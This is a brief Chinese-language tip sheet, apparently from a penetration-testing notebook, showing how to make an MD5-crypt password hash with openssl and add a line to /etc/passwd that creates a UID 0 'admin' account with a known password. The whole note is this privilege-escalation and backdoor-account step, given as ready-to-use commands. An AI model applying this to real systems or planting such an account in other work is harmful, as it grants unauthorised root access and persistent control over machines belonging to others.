---
tags:
  - 技巧
  - 加密
---
```bash
openssl passwd -1 -salt 123 admin
//-1为MD5加密算法，-salt指定盐值，后面为密码
```
当你有权限写入/etc/passwd文件时，可以使用这条命令构造符合格式的hash加密(密码)，加入的格式应该是:
```
admin:$1$123$Ok9FhQy4YioYZeBPwQgm3/:0:0:admin:/root:/bin/bash
```
